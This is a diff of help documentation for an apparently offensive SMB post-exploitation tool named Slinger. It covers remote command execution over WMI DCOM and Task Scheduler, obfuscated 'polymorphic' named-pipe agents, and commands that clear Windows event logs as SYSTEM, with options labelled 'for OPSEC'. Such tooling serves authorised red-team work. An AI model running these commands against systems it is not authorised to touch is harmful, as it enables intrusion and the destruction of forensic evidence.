@@ -2502,7 +2695,7 @@ Example Usage: reload
 
 **Help:**
 ```
-plugins [-h]
+usage: plugins [-h]
 List available plugins
 ```
 
@@ -2519,7 +2712,7 @@ Example Usage: plugins
 
 **Help:**
 ```
-changes [-h]
+usage: changes [-h]
                        [--category {FILE,SERVICE,TASK,REGISTRY,AGENT,EXEC}]
                        [--save] [--clear]
 Display audit trail of all write operations this session
@@ -2544,7 +2737,7 @@ Example Usage: changes | changes --category FILE | changes --save
 
 **Help:**
 ```
-downloads [-h] {list,cleanup} ...
+usage: downloads [-h] {list,cleanup} ...
 Manage resume download states and cleanup
 ```
 
@@ -2561,7 +2754,7 @@ Example Usage: downloads list
 
 **Help:**
 ```
-downloads list [-h]
+usage: downloads list [-h]
 Display all active resumable downloads with progress
 ```
 
@@ -2575,7 +2768,7 @@ Display all active resumable downloads with progress
 
 **Help:**
 ```
-downloads cleanup [-h] [--max-age MAX_AGE] [--force]
+usage: downloads cleanup [-h] [--max-age MAX_AGE] [--force]
 Remove completed, stale, or corrupted download state files
 ```
 
@@ -2593,46 +2786,65 @@ Remove completed, stale, or corrupted download state files
 
 **Help:**
 ```
-eventlog [-h] {query,list,check} ...
+usage: eventlog [-h] {query,list,check,clear,status} ...
 Query Windows Event Logs via RPC over SMB named pipe \pipe\eventlog
 ```
 
 **Example Usage:**
 ```
-Example Usage:
-  eventlog list                    # List available event logs
-  eventlog check --log 'System'    # Check if a specific log exists
-  eventlog query --log System --level Error --count 50
-  eventlog sources --log Application
+Examples:
+  eventlog status                                                     # Check if eventlog pipe exists
+  eventlog list --method rpc                                          # List available event logs
+  eventlog check --method rpc --log System                            # Check if a log exists
+  eventlog query --method rpc --log System --last 30 --limit 10       # Query via RPC
+  eventlog query --method atexec --log System --limit 10              # Query via Task Scheduler
+  eventlog query --method rpc --log System --format json -o events.json  # Export to JSON
+  eventlog clear --method atexec --log Application --force            # Clear via Task Scheduler
+  eventlog clear --method wmiexec --log System --force                # Clear via WMI DCOM
 ```
 
 ### Subcommands
 
 #### `eventlog query`
 
-**Description:** Query Windows Event Log entries via RPC over \pipe\eventlog with filtering
+**Description:** Query Windows Event Log entries with filtering and export
 
 **Help:**
 ```
-eventlog query [-h] --log LOG [--id ID]
+usage: eventlog query [-h] --method {rpc,atexec,wmiexec} --log LOG
+                              [--id ID]
                               [--type {error,warning,information,success,failure}]
                               [--since SINCE] [--last MINUTES] [--limit LIMIT]
                               [--source SOURCE] [--find FIND]
                               [--format {table,json,list,csv}] [-o OUTPUT]
                               [--verbose] [--order {newest,oldest}]
-Query Windows Event Log entries via RPC over \pipe\eventlog with filtering
+                              [--sp PATH] [--sn NAME] [--tn NAME]
+                              [--ta AUTHOR] [--td DESC] [--tf FOLDER]
+                              [--sh SHARE] [-w SECS]
+Query Windows Event Log entries with filtering and export
 ```
 
 **Example Usage:**
 ```
 Examples:
-  eventlog query --log System --id 1000
-  eventlog query --log Application --level error --last 60
-  eventlog query --log Security --find 'failed logon' --count 20
+  eventlog query --method rpc --log System --last 30 --limit 10
+  eventlog query --method rpc --log Application --level error --limit 20
+  eventlog query --method rpc --log Security --find 'failed logon' --limit 20
+  eventlog query --method rpc --log System --format json -o events.json
+  eventlog query --method rpc --log System --format csv -o events.csv
+  eventlog query --method atexec --log Security --limit 50
+  eventlog query --method wmiexec --log System --limit 10
+
+Methods:
+  rpc      - Query via \pipe\eventlog RPC (default, fastest)
+  atexec   - Query via 'wevtutil qe' as SYSTEM through Task Scheduler
+  wmiexec  - Query via 'wevtutil qe' as SYSTEM through WMI DCOM
 ```
 
 ##### Arguments
 
+- **`method`**: Query method: rpc (\pipe\eventlog), atexec (Task Scheduler), or wmiexec (WMI DCOM)
+  - Choices: rpc, atexec, wmiexec
 - **`log`**: Event log name (System, Application, Security, etc.)
 - **`id`**: Specific event ID to filter
 - **`level`**: Event level to filter
@@ -2640,7 +2852,7 @@ Examples:
 - **`since`**: Events since date (YYYY-MM-DD or 'YYYY-MM-DD HH:MM:SS')
 - **`last`**: Events from the last X minutes
 - **`limit`**: Maximum number of events to return
-  - Default: `1000`
+  - Default: `10`
 - **`source`**: Filter by event source name
 - **`find`**: Search for string in event content
 - **`format`**: Output format (default: list)
@@ -2650,20 +2862,60 @@ Examples:
 - **`order`**: Order events by newest first (default) or oldest first
   - Choices: newest, oldest
   - Default: `newest`
+- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
+  - Default: `\Users\Public\Downloads\`
+- **`sn`**: Filename for command output (default: random)
+- **`tn`**: Scheduled task name (default: auto-generated)
+- **`ta`**: Task author for OPSEC (default: Slinger)
+  - Default: `Slinger`
+- **`td`**: Task description for OPSEC (default: Slinger Task)
+  - Default: `Slinger Task`
+- **`tf`**: Task Scheduler folder (default: \Windows)
+  - Default: `\Windows`
+- **`sh`**: SMB share for output file (default: current share)
+- **`wait`**: Seconds to wait for task completion (default: 2)
+  - Default: `2`
   - Required: No
 
 ---
 
 #### `eventlog list`
 
-**Description:** List all available event logs on the remote system via RPC over \pipe\eventlog
+**Description:** List all available event logs on the remote system
 
 **Help:**
 ```
-eventlog list [-h]
-List all available event logs on the remote system via RPC over \pipe\eventlog
+usage: eventlog list [-h] --method {rpc,atexec,wmiexec} [--sp PATH]
+                             [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
+                             [--tf FOLDER] [--sh SHARE] [-w SECS]
+List all available event logs on the remote system
 ```
 
+**Example Usage:**
+```
+Examples:
+  eventlog list --method rpc                                 # List via RPC pipe
+  eventlog list --method atexec                              # List via Task Scheduler (wevtutil)
+  eventlog list --method wmiexec                             # List via WMI DCOM (wevtutil)
+```
+
+##### Arguments
+
+- **`method`**: Method: rpc (\pipe\eventlog), atexec (Task Scheduler), or wmiexec (WMI DCOM)
+  - Choices: rpc, atexec, wmiexec
+- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
+  - Default: `\Users\Public\Downloads\`
+- **`sn`**: Filename for command output (default: random)
+- **`tn`**: Scheduled task name (default: auto-generated)
+- **`ta`**: Task author for OPSEC (default: Slinger)
+  - Default: `Slinger`
+- **`td`**: Task description for OPSEC (default: Slinger Task)
+  - Default: `Slinger Task`
+- **`tf`**: Task Scheduler folder (default: \Windows)
+  - Default: `\Windows`
+- **`sh`**: SMB share for output file (default: current share)
+- **`wait`**: Seconds to wait for task completion (default: 2)
+  - Default: `2`
   - Required: No
 
 ---
@@ -2674,19 +2926,108 @@ List all available event logs on the remote system via RPC over \pipe\eventlog
 
 **Help:**
 ```
-eventlog check [-h] --log LOG
+usage: eventlog check [-h] --method {rpc,atexec,wmiexec} --log LOG
+                              [--sp PATH] [--sn NAME] [--tn NAME]
+                              [--ta AUTHOR] [--td DESC] [--tf FOLDER]
+                              [--sh SHARE] [-w SECS]
 Check if a specific Windows Event Log exists and is accessible
 ```
 
 **Example Usage:**
 ```
-Example Usage: eventlog check --log 'Microsoft-Windows-Sysmon/Operational'
+Examples:
+  eventlog check --method rpc --log System                   # Check via RPC pipe
+  eventlog check --method atexec --log Security              # Check via Task Scheduler (wevtutil)
+  eventlog check --method wmiexec --log Application          # Check via WMI DCOM (wevtutil)
 ```
 
 ##### Arguments
 
+- **`method`**: Method: rpc (\pipe\eventlog), atexec (Task Scheduler), or wmiexec (WMI DCOM)
+  - Choices: rpc, atexec, wmiexec
 - **`log`**: Event log name to check (can include custom paths)
-  - Required: Yes
+- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
+  - Default: `\Users\Public\Downloads\`
+- **`sn`**: Filename for command output (default: random)
+- **`tn`**: Scheduled task name (default: auto-generated)
+- **`ta`**: Task author for OPSEC (default: Slinger)
+  - Default: `Slinger`
+- **`td`**: Task description for OPSEC (default: Slinger Task)
+  - Default: `Slinger Task`
+- **`tf`**: Task Scheduler folder (default: \Windows)
+  - Default: `\Windows`
+- **`sh`**: SMB share for output file (default: current share)
+- **`wait`**: Seconds to wait for task completion (default: 2)
+  - Default: `2`
+  - Required: No
+
+---
+
+#### `eventlog clear`
+
+**Description:** Clear all events from a Windows Event Log (cannot be undone)
+
+**Help:**
+```
+usage: eventlog clear [-h] --log LOG --method {rpc,atexec,wmiexec}
+                              [--force] [--sp PATH] [--sn NAME] [--tn NAME]
+                              [--ta AUTHOR] [--td DESC] [--tf FOLDER]
+                              [--sh SHARE] [-w SECS]
+Clear all events from a Windows Event Log (cannot be undone)
+```
+
+**Example Usage:**
+```
+Examples:
+  eventlog clear --log System --method atexec --force        # wevtutil as SYSTEM via Task Scheduler
+  eventlog clear --log Application --method wmiexec --force  # wevtutil as SYSTEM via WMI DCOM
+  eventlog clear --log Security --method rpc --force         # RPC via \pipe\eventlog (needs elevated privs)
+
+Methods:
+  rpc      - Direct RPC via \pipe\eventlog. Requires SE_SECURITY_PRIVILEGE (fails with UAC filtering)
+  atexec   - Runs 'wevtutil cl' as SYSTEM via Task Scheduler. Requires share connection. Leaves Event ID 1102
+  wmiexec  - Runs 'wevtutil cl' as SYSTEM via WMI DCOM. Requires DCOM ports (135+dynamic). Leaves Event ID 1102
+```
+
+##### Arguments
+
+- **`log`**: Event log name to clear
+- **`method`**: Clearing method: rpc, atexec (Task Scheduler), or wmiexec (WMI DCOM)
+  - Choices: rpc, atexec, wmiexec
+- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
+  - Default: `\Users\Public\Downloads\`
+- **`sn`**: Filename for command output (default: random)
+- **`tn`**: Scheduled task name (default: auto-generated)
+- **`ta`**: Task author for OPSEC (default: Slinger)
+  - Default: `Slinger`
+- **`td`**: Task description for OPSEC (default: Slinger Task)
+  - Default: `Slinger Task`
+- **`tf`**: Task Scheduler folder (default: \Windows)
+  - Default: `\Windows`
+- **`sh`**: SMB share for output file (default: current share)
+- **`wait`**: Seconds to wait for task completion (default: 2)
+  - Default: `2`
+  - Required: No
+
+---
+
+#### `eventlog status`
+
+**Description:** Check IPC$ pipes for eventlog service availability
+
+**Help:**
+```
+usage: eventlog status [-h]
+Check IPC$ pipes for eventlog service availability
+```
+
+**Example Usage:**
+```
+Examples:
+  eventlog status                  # Check if \pipe\eventlog exists in IPC$
+```
+
+  - Required: No
 
 ---
 
@@ -2696,7 +3037,7 @@ Example Usage: eventlog check --log 'Microsoft-Windows-Sysmon/Operational'
 
 **Help:**
 ```
-wmiexec [-h] [--endpoint-info] METHOD ...
+usage: wmiexec [-h] [--endpoint-info] METHOD ...
 Execute commands on the remote system using various WMI execution methods. Each method has different capabilities, stealth levels, and requirements.
 ```
 
@@ -2721,12 +3062,10 @@ Example Usage:
 
 **Help:**
 ```
-wmiexec dcom [-h] [-i] [--working-dir WORKING_DIR]
-                            [--timeout TIMEOUT] [--output filename]
-                            [--no-output] [--sleep-time SLEEP_TIME]
-                            [--save-name SAVE_NAME] [--raw-command]
-                            [--shell {cmd,powershell}]
-                            [command]
+usage: wmiexec dcom [-h] [-c COMMAND] [-i] [--timeout TIMEOUT]
+                            [--output filename] [--no-output]
+                            [--sleep-time SLEEP_TIME] [--sp PATH] [--sn NAME]
+                            [--raw-command] [--shell {cmd,powershell}]
 Execute commands using traditional WMI Win32_Process.Create method via DCOM. Requires DCOM connectivity (ports 135 + dynamic range). May be blocked by firewalls.
 ```
 
@@ -2742,28 +3081,35 @@ Raw Command Usage:
   Use --raw-command when you want to execute commands WITHOUT the cmd.exe wrapper:
 
   Standard (with cmd.exe wrapper):
-    wmiexec dcom "whoami"              # Executes: cmd.exe /Q /c whoami
-    wmiexec dcom "dir C:\"            # Executes: cmd.exe /Q /c dir C:
+    wmiexec dcom -c "whoami"              # Executes: cmd.exe /Q /c whoami
+    wmiexec dcom -c "dir C:\"            # Executes: cmd.exe /Q /c dir C:
   Raw (no wrapper):
-    wmiexec dcom "whoami" --raw-command              # Executes: whoami (directly)
-    wmiexec dcom "calc.exe" --raw-command            # Executes: calc.exe (directly)
-    wmiexec dcom "powershell.exe -Command Get-Process" --raw-command  # Custom PowerShell
+    wmiexec dcom -c "whoami" --raw-command              # Executes: whoami (directly)
+    wmiexec dcom -c "calc.exe" --raw-command             # Executes: calc.exe (directly)
+
+  Output control:
+    wmiexec dcom -c "whoami" --no-output                 # Execute without capturing output
+    wmiexec dcom -c "whoami" --sp "C:\Users\Public"    # Custom save path for output file
+    wmiexec dcom -c "whoami" --sn myoutput.txt           # Custom output filename
 
 Interactive Mode:
-  wmiexec dcom --interactive           # Start interactive DCOM shell
-  wmiexec dcom --interactive --save-name session.txt  # Save session to file
+  wmiexec dcom -i                        # Start interactive DCOM shell
+  wmiexec dcom -i --output session.txt   # Save session log to local file
+  wmiexec dcom -i --sp "C:\Users\Public" --sn out.txt    # Custom remote output path/name per command
+  wmiexec dcom -i --shell powershell                       # Interactive PowerShell shell
+
+Note: WMI working directory syncs with SMB 'cd'. Use 'cd' to change directory before running commands.
 ```
 
 ##### Arguments
 
 - **`command`**: Command to execute (not required for --interactive mode)
-- **`working_dir`**: Working directory for command execution
-  - Default: `C:\`
 - **`timeout`**: Command execution timeout in seconds
   - Default: `30`
 - **`output`**: Save command output to local file
 - **`sleep_time`**: Sleep time before capturing output in seconds
   - Default: `1.0`
+- **`save_path`**: Directory on target to save output file (default: auto-detect from share)
 - **`save_name`**: Custom filename for remote output capture (default: auto-generated)
 - **`shell`**: Shell to use for command execution
   - Choices: cmd, powershell
@@ -2796,7 +3142,7 @@ Examples:
 
 **Help:**
 ```
-wmiexec event [-h] [--consumer-name CONSUMER_NAME]
+usage: wmiexec event [-h] [--consumer-name CONSUMER_NAME]
                              [--filter-name FILTER_NAME]
                              [--trigger-delay TRIGGER_DELAY] [--no-cleanup]
                              [--timeout TIMEOUT] [--no-output]
@@ -2863,7 +3209,7 @@ Examples:
 
 **Help:**
 ```
-wmiexec query [-h] [--namespace NAMESPACE]
+usage: wmiexec query [-h] [--namespace NAMESPACE]
                              [--format {list,table,json,csv}] [-o FILE]
                              [--timeout SECONDS]
                              [--interactive | --describe CLASS |
@@ -2908,7 +3254,7 @@ Query Examples:
 
 **Help:**
 ```
-agent [-h]
+usage: agent [-h]
                      {build,info,deploy,list,rename,check,use,start,kill,rm,reset,update} ...
 Build polymorphic C++ agents for named pipe command execution
 ```
@@ -2926,7 +3272,7 @@ Example Usage: agent build --arch x64 | agent deploy ./agent.exe --path temp\\ -
 
 **Help:**
 ```
-agent build [-h] [--arch {x86,x64,both}] [--encryption]
+usage: agent build [-h] [--arch {x86,x64,both}] [--encryption]
                            [--no-encryption] [--debug]
                            [--output-dir OUTPUT_DIR] [--dry-run] [--pipe PIPE]
                            [--name NAME] [--pass PASSPHRASE] [--obfuscate]
@@ -2970,7 +3316,7 @@ Examples:
 
 **Help:**
 ```
-agent info [-h]
+usage: agent info [-h]
 Display configuration and capabilities of the agent builder
 ```
 
@@ -2984,7 +3330,7 @@ Display configuration and capabilities of the agent builder
 
 **Help:**
 ```
-agent deploy [-h] --path PATH --name NAME [--start]
+usage: agent deploy [-h] --path PATH --name NAME [--start]
                             [--method {wmiexec,atexec}] [--pipe PIPE]
                             [--sp PATH] [--sn NAME] [--tn NAME] [--ta AUTHOR]
                             [--td DESC] [--tf FOLDER] [--sh SHARE] [-w SECS]
@@ -3037,7 +3383,7 @@ Note: --method, --ta, --td, --tf and other atexec options only apply with --meth
 
 **Help:**
 ```
-agent list [-h] [--host HOST] [--del DELETE_AGENT]
+usage: agent list [-h] [--host HOST] [--del DELETE_AGENT]
                           [-f {table,list,json}]
 Show all deployed agents and their status
 ```
@@ -3064,7 +3410,7 @@ Example: agent list -f json
 
 **Help:**
 ```
-agent rename [-h] --old OLD --new NEW
+usage: agent rename [-h] --old OLD --new NEW
 Change the ID of a deployed agent in the registry
 ```
 
@@ -3087,7 +3433,7 @@ Example: agent rename --old slinger_abc123 --new my_agent
 
 **Help:**
 ```
-agent check [-h] agent_id
+usage: agent check [-h] agent_id
 Verify if the agent process is still running via WMI query
 ```
 
@@ -3129,7 +3475,7 @@ INTERACTIVE SHELL COMMANDS:
 
 **Help:**
 ```
-agent use [-h] [--timeout TIMEOUT] [--no-colors] agent_id
+usage: agent use [-h] [--timeout TIMEOUT] [--no-colors] agent_id
 Connect to and interact with a deployed agent via named pipe.
 
 ENCRYPTION & SESSION SECURITY:
@@ -3173,7 +3519,7 @@ Example: agent use agent_12345 --no-colors
 
 **Help:**
 ```
-agent start [-h] [--method {wmiexec,atexec}] [--sp PATH]
+usage: agent start [-h] [--method {wmiexec,atexec}] [--sp PATH]
                            [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
                            [--tf FOLDER] [--sh SHARE] [-w SECS]
                            agent_id
@@ -3221,7 +3567,7 @@ Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
 
 **Help:**
 ```
-agent kill [-h] [--method {wmiexec,atexec}] [--sp PATH]
+usage: agent kill [-h] [--method {wmiexec,atexec}] [--sp PATH]
                           [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
                           [--tf FOLDER] [--sh SHARE] [-w SECS]
                           agent_id
@@ -3270,7 +3616,7 @@ Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
 
 **Help:**
 ```
-agent rm [-h] agent_id
+usage: agent rm [-h] agent_id
 Delete the agent executable file and update registry status
 ```
 
@@ -3292,7 +3638,7 @@ Example: agent rm slinger_abc123
 
 **Help:**
 ```
-agent reset [-h] [--method {wmiexec,atexec}] [--sp PATH]
+usage: agent reset [-h] [--method {wmiexec,atexec}] [--sp PATH]
                            [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
                            [--tf FOLDER] [--sh SHARE] [-w SECS]
 Kill all running agent processes and delete all agent files
@@ -3338,7 +3684,7 @@ Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
 
 **Help:**
 ```
-agent update [-h] --path PATH agent_id
+usage: agent update [-h] --path PATH agent_id
 Update the agent's file path in the registry
 ```
 
